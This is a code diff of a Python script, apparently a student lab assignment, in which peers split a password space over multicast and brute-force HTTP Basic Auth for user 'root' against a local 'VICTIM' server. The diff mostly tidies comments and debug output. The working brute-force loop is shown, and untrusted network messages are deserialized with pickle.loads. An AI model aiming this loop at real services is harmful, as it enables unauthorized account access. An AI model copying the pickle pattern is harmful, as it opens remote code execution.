@@ -141,14 +141,7 @@ def contains(r1 : list, r2 : list):
     return False
 
 class zerg:
-    # Get it get it it's a zerg rush
-    # StarCraft ref - they're played by bruteforce :D
-    # like here :D
-    # until we can bamboozle the server that is
-
     def __init__(self, name: str = ""):
-        # identifier
-        #self.timejoin = time.time()
 
         # --Init Variables n stuff we'll need----
         self.sel = selectors.DefaultSelector()
@@ -191,11 +184,13 @@ class zerg:
         print("I AM:",self.address)
 
     def isVerified(self, num : int):
+        '''See if password has been tested before'''
         for i in range(len(self.verified)):
             if self.verified[i][0] >= num >= self.verified[i][1]: return True
         return False
     
     def isRangeVerified(self):
+        '''See if range of passwords have been tested before'''
         for i in range(len(self.verified)):
             if contains(self.verified[i],self.range):
                 return True
@@ -213,19 +208,13 @@ class zerg:
     def selectNewRange(self):
         # firstly, tries to find any space not occupied by another slave
         self.updateVerified()
-        # print("Deciding a new range!")
-        # print("\tVerified:",self.verified)
-        # print("\tPeer ranges:",self.peers)
         allOccupied = copy.deepcopy(self.verified)
         for peer in self.peers.keys():
             allOccupied.append(self.peers[peer][1])
         allOccupied = mergeList(allOccupied)
-        # print("\tOccupied:",allOccupied)
         if allOccupied[0][1]-allOccupied[0][0] != 62**PASSWORD_SIZE:
             # a space without an active slave exists! -> immediately occupies the biggest space like this
-            # print("Found at least one empty space! Occupying one.")
             invert = invertRangeList(allOccupied)
-            # print("Free spaces:",invert)
             betterIDX = -1
             betterRNG = 62**PASSWORD_SIZE+1
             for i in range(len(invert)):
@@ -234,20 +223,13 @@ class zerg:
                     betterRNG = RNG
                     betterIDX = i
 
-            #partToPick=random.randint(0,len(invert)-1)
-            #print("DEBUG: betterIDX",betterIDX)
             if betterRNG > 30*PASSWORD_SIZE:
                 return [invert[betterIDX][0],invert[betterIDX][0]+30*PASSWORD_SIZE-1]
             else:
                 return invert[betterIDX]
         else:
             # all spaces are occupied by slaves or already checked -> choses the peer with the biggest workload, and divides it
-            #print("No empty spaces, stealing from a peer.")
-            #self.updateVerified()
-            #invert = invertRangeList(self.verified)
-            #print("DEBUG2: verified",self.verified)
-            #print("DEBUG2: invert",invert)
-
+            
             betterPeer = -1
             betterRNG = 0
             for peer in self.peers.keys():
@@ -255,26 +237,22 @@ class zerg:
                 if RNG > betterRNG:
                     betterRNG = RNG
                     betterPeer = peer
-            #print("It would seems peer",betterPeer,"is the most overworked, taking from them!")
-            #print("Better idx",betterIDX)
             low = int((self.peers[betterPeer][1][1] - self.peers[betterPeer][1][0])/2)
             return [low,self.peers[betterPeer][1][1]]
 
-    def sayHello(self):
+    def sayHello(self):                             # Peer joins the group
         '''Get a hello message'''  # Hello there
         msg = {
             'command': 'hello'
-            # should we include our address here or smth?
         }
         encodedMSG = pickle.dumps(msg)
 
-        #print("Sending HELLO message:", msg)
+        # Send the Hello message to peers (via Multicast)
         self.mCastSock.setsockopt(
             socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
         self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
-        #self.range = [0, 62**PASSWORD_SIZE]
 
-    def sayImHere(self):
+    def sayImHere(self):                           
         '''Get a imhere message'''  # General Kenobi
         msg = {
             'command': 'imhere',
@@ -282,115 +260,72 @@ class zerg:
             'range': self.range,
         }
         encodedMSG = pickle.dumps(msg)
-
-        #print("Sending IMHERE message:", msg)
+        
+        # Send the ImHere message to peers (via Multicast)
         self.mCastSock.setsockopt(
             socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
         self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
 
     def sayFoundPW(self):
-        '''Get a foundpw message'''  # General Kenobi
+        '''Get a foundpw message'''  # Win
         msg = {
             'command': 'foundpw',
             'pw': self.pw
         }
         encodedMSG = pickle.dumps(msg)
 
-        #print("Slave", self.name+":", "sending FOUNDPW message:", msg)
         self.mCastSock.setsockopt(
             socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
         self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
         
     
-
-
     def sendMCAST(self, msg):
-        #print("Slave", self.name+":", "sending message:", msg)
+        '''Send a message to our peers'''
         self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
         self.mCastSock.sendto(msg, (self.MCAST_GRP, self.MCAST_PORT))
         while True:
-            #print("Slave", self.name+":", "waiting to recieve.")
             try:
                 data, server = self.mcastSock.recvfrom(1024)
             except socket.timeout:
                 print("timed out, no more responses.")
                 break
             else:
-                #print("Slave", self.name+":", "recieved:", data, "from", server)
-                #print("aljfhdgajdshfbkasdjfnksnf")
-                if server not in self.peers.keys():
-                    #how does this not throw an error?????????? -c
-                    # print("SKDFGSDHJFVHSDFHGIUSDJFOSDHBSJDHGBLKSDJKVBVNSDJKGBGBISDFBNBJSJDNGBNSKGFJKGJBNSDNFBSJNDFBFBKJN")
-                    # print(self.peers)
+                if server not in self.peers.keys():     # New peer, add them to our contact book
                     self.peers[server]=[-1,[0,0]]
-                    #print("after",self.peers)
 
 
     def recvMCAST(self):
-        #print("Slave",self.name+":","waiting to recieve. recvmcast")
+        '''Receive messages from our peers (and process them)'''
         try:
             data, server = self.mCastSock.recvfrom(1024)
-            #print("\n\n!!!!",server,"\n\n")
         except socket.timeout:
-            #print("Slave",self.name+":","timed out, no more responses.")
+            #print("Slave",self.name+":","timed out, no more responses.") Silent peer
             return
         else:
-            #check if we're receiving our own messages
-            #print("Slave",self.name+":","recieved:",data,"from",server)
-            #print("\n",self.mCastSock,"\n")
-            recvMSG = pickle.loads(data) # I'm here message
-            #print("received message:",recvMSG)
+            recvMSG = pickle.loads(data) 
             if server in self.peers:
-                self.peers[server]=[time.time(),self.peers[server][1]] #last seen at:
+                self.peers[server]=[time.time(),self.peers[server][1]] # last seen at: now
             else:
-                self.peers[server]=[time.time(),[0,0]]
+                self.peers[server]=[time.time(),[0,0]]  # New peer
             if recvMSG['command']=='hello':
-                #print("Recieved HELLO message:", recvMSG,"from",server,"\n\n")
-                self.sayImHere()
+                self.sayImHere()                        # Answer Hello with ImHere
             elif recvMSG['command']=='imhere':
-                #print("Slave",self.name+":","It's a imhere message:", recvMSG)
-                #print("Recieved IMHERE message:", recvMSG,"from",server)
+                # Sort out stored ranges and verified pwds
                 peerRange = recvMSG['range']
                 self.peers[server][1] = peerRange
                 peerVerified = recvMSG['verified']
-                #print("Final Result:",self.verified,"\n\n")
+
                 for range in peerVerified:
-                    #print("Adding verified:", range)
                     self.verified.append(range)
-                #print("Result:",self.verified,"Smoothing it out...")
                 self.updateVerified()
-                #print("Final Result:",self.verified,"\n\n")
-                #print("My range:",self.range,"They're range:",peerRange)
+
                 if overlaps(self.range,peerRange):
+                    #There's a range overlap!
                     if compareAddr(self.address,server[0]) > 0:
-                        #print("Our ranges overlap! Changing mine.")
-                        #I need to adjust my range
-                        # print("\n\nNEW RANGE!")
+                        #I need to adjust my range if my ip is lower than the peer
                         self.range = self.selectNewRange()
-                        # print("Decided on:",self.range,"\n\n")
                         self.current = self.range[0]-1
-                        #self.sayNewRange()
-                        #print("IMHERE RESULT: New range:",self.range,"Starting from:",self.current,"\n\n")
-                    else:
-                        #print("IMHERE RESULT: Our ranges overlap! But I don't have to change. Continuing...","\n\n")
-                        pass
-                else: 
-                    #print("IMHERE RESULT: Our ranges don't overlap!","\n\n")
-                    pass
-            # elif recvMSG['command']=='newrange':
-            #     #print("Recieved NEWRANGE message:", recvMSG,"from",server)
-            #     peerRange = recvMSG['range']
-            #     self.peers[server][1] = peerRange
-            #     #print("My range:",self.range,"They're range:",peerRange)
-            #     if self.rangeOverlaps(peerRange):
-            #         #print("NEW RANGE RESULT: Our ranges overlap! Someone is trying to offload some of my work.") 
-            #         pass
-            #         #print("New range:",self.range,"Continuing from:",self.current,"\n\n")
-            #     else:
-            #         #print("NEW RANGE RESULT: Our ranges don't overlap! Peer updated.","\n\n")
-            #         pass
-            # elif recvMSG['command']=='gotall':
-            #     pass
+
             elif recvMSG['command']=='foundpw':
                 print("Password found:",recvMSG["pw"]+"!","Shutting down...")
                 exit(0) # Shutting down...
@@ -402,63 +337,47 @@ class zerg:
         self.s.connect((self.HOST, self.PORT))
 
     def try_pw(self, pw: str):
-        """Creates the AuthHeader with the created pw"""  # password, not powerword - a priest would help here though
+        """Creates the AuthHeader with the created pw"""  
         ID = "root"
 
         authHead = ID+":"+pw
         authHeadB64 = base64.b64encode(authHead.encode()).decode()
 
-        httpHeader = f'''GET / HTTP/1.1\nHost: localhost\nAuthorization: Basic {authHeadB64}\r\n\r\n'''  # internet says to use carriage return but not sure why
+        httpHeader = f'''GET / HTTP/1.1\nHost: localhost\nAuthorization: Basic {authHeadB64}\r\n\r\n'''  
 
-        #print("testing pw:", pw)
-        #print("PW:", pw)
         msg = httpHeader
         self.send_msg(msg)
 
     def send_msg(self, msg):
-        """Sends ONE (1) message to VICTIM"""  # mwahaha
+        """Sends ONE (1) message to VICTIM"""  
         encoded_msg = str(msg).encode("utf-8")
         self.s.send(encoded_msg)
         self.server_response()
 
     def victory(self):
+        '''Receive the success.jpg picture'''
         picture_raw=b""
         pic_part=b""
         incoming_parts=b""
-        while True: #end of jpg
+        while True:
             while not b"\r\n" in incoming_parts:
-                incoming_parts = incoming_parts+self.s.recv(1)
-                print("incoming parts:",incoming_parts)
+                #Get the size of next chunk
+                incoming_parts = incoming_parts+self.s.recv(1)  # Byte a Byte enche a galinha o papo
                 if incoming_parts == b"":
-                    #picture_raw=b"\xFF\xD8"+picture_raw.split(b"\xFF\xD8")[1]
-                    # print("pic raw:",picture_raw.decode())
+                    # End of message
+                    print("Picture received!")
                     with open("success.jpg", "wb") as img:
                         img.write(picture_raw)
-                    #data = open("success.jpg", "rb").read()
-                    exit(0)
-            size=incoming_parts.split(b"\r\n")[0]
-            #print("raw  chunk size? :",size)
+                    return
+            size=incoming_parts.split(b"\r\n")[0]               # Remove pesky chunked line separators
             size=int(size,16)
-            print("next size:",size)
-            incoming_parts = (self.s.recv(int(size)+3))
-            print("DEBUG: defore clean:",incoming_parts)
-            # \r\n e o separador de chunked, not \t\n\r\n, era bait
-            incoming_parts=incoming_parts[:-2] # these are not the bytes you're looking for
-            print("DEBUG: after clean:",incoming_parts)
+            incoming_parts = (self.s.recv(int(size)+2))         # +2 to account for the line separators
+            incoming_parts=incoming_parts[:-2]                  # these are not the bytes you're looking for
 
-            print("very rawreceived",incoming_parts)
-            #if incoming_parts.match("\\x[0-9A-F][0-9A-F]"):
             picture_raw=picture_raw+incoming_parts
             incoming_parts=b""
 
-            #print(" rawreceived: ",incoming_parts.split(b'\r\n')[1])
-
-            #print("received: ",incoming_parts.decode())
-            #print(picture_raw,"\n---------------------\n\n\n")
-
-
        
-
     def server_response(self):
         """Receives ONE (1) http response"""
         incoming = ""
@@ -466,51 +385,36 @@ class zerg:
         while not "\r\n\r\n" in incoming:
             incoming_parts = self.s.recv(500)
             incoming_raw=incoming_raw+incoming_parts
-            # try:
             incoming = incoming_raw.decode("ascii")
-            # except UnicodeDecodeError:
-                # I think we're supposed to receive a picture here but this is a puzzle for future camila :P
-            #   self.victory(incoming_raw)
-            #    break
-            #else:
-        #print("\n\n!!!!!",incoming,"\n\n")
-            #    pass
-        
 
-        if '200' in incoming.split("\r\n\r\n")[0]:
+        if '200' in incoming.split("\r\n\r\n")[0]:              # Success!
             self.found = True
             self.pw = getPWfromIDX(self.current, PASSWORD_SIZE)
             print("GOT IT!\nwas it "+self.pw+"?")
             self.sayFoundPW()
-            print("VERY IMPORTANT: ",incoming.split("\r\n\r\n"))
-            self.victory()
+            self.victory()                                      # Process the picture
 
     def loop(self):
-        #self.sayHello()
-        while not self.found:
-            #print("time now:",time.time())
-            #print("target time:",self.lastTry + COOLDOWN_TIME/1000)
-            if self.isRangeVerified(): 
+        '''Main Loop'''
+        while not self.found:                                   # We exit manually but doesn't hurt
+            if self.isRangeVerified():                          # Range is overlapping
                 self.range = self.selectNewRange()
                 self.current = self.range[0]-1
-            if time.time()>self.lastTry + COOLDOWN_TIME/1000:  # TODO - verify  that cooldown time has passed since last time
-                print("all your base are belong to us")  # nice ref :D
+            if time.time()>self.lastTry + COOLDOWN_TIME/1000:   # If Cooldown Time has passed since last try
+                print("all your base are belong to us")         # nice ref :D
                 print(time.ctime(time.time()),": MY RANGE =",self.range)
                 toTest = []
                 full = False
-                for i in range(MIN_TRIES):  # get next MIN_TRIES passwords from ids
+                for i in range(MIN_TRIES):                      # get next MIN_TRIES passwords from ids
                     self.current += 1
                     if self.current > self.range[1]:
                         full = True
                         break
                     if self.isVerified(self.current): continue
                     self.try_pw(getPWfromIDX(self.current, PASSWORD_SIZE))
-                    print("TRIED:",self.current)
+                    print("TRIED:",self.current+1)
                     self.addToVerified(self.current)
-                    #self.range[0] = self.current+1
                     if self.found:
-                        # send FOUNDPW message
-                        #print("it was "+getPWfromIDX(self.current, PASSWORD_SIZE))
                         return getPWfromIDX(self.current, PASSWORD_SIZE)
                 self.lastTry = time.time()
                 self.sayImHere()
@@ -541,58 +445,3 @@ class zerg:
 
 slave = zerg("Brood1")
 slave.loop()
-
-#################### OLD
-
-# def newRange(self):
-    #     '''Get a newrange message'''  # this is mine now
-    #     msg = {
-    #         'command': 'newrange',
-    #         'range': self.range
-    #     }
-    #     encodedMSG = pickle.dumps(msg)
-
-    #     #print("Slave", self.name+":", "sending NEWRANGE message:", msg)
-    #     self.mCastSock.setsockopt(
-    #         socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
-    #     self.mCastSock.sendto(encodedMSG,(self.MCAST_GRP, self.MCAST_PORT))
-        
-
-    # def gotAll(self):
-    #     '''Get a gotall message'''   # my work here is done
-    #     msg = {
-    #         'command': 'gotall'
-    #     }
-    #     encodedMSG = pickle.dumps(msg)
-
-    #     #print("Slave", self.name+":", "sending GOTALL message:", msg)
-    #     self.mCastSock.setsockopt(
-    #         socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
-    #     self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
-
-
-    # def foundPw(self):  # the 200 ok marks the spot
-    #     '''Get a gotall message'''
-    #     msg = {
-    #         'command': 'foundpw',
-    #         'pw': self.pw
-    #     }
-    #     encodedMSG = pickle.dumps(msg)
-    #     #print("Slave", self.name+":", "sending FOUNDPW message:", msg)
-    #     self.mCastSock.setsockopt(
-    #         socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
-    #     self.mCastSock.sendto(encodedMSG,(self.MCAST_GRP, self.MCAST_PORT))
-    #     exit(0)
-
-        # def sayNewRange(self):
-    #     '''Get a newrange message'''  # General Kenobi
-    #     msg = {
-    #         'command': 'newrange',
-    #         'range': self.range
-    #     }
-    #     encodedMSG = pickle.dumps(msg)
-
-    #     #print("Slave", self.name+":", "sending NEWRANGE message:", msg)
-    #     self.mCastSock.setsockopt(
-    #         socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
-    #     self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
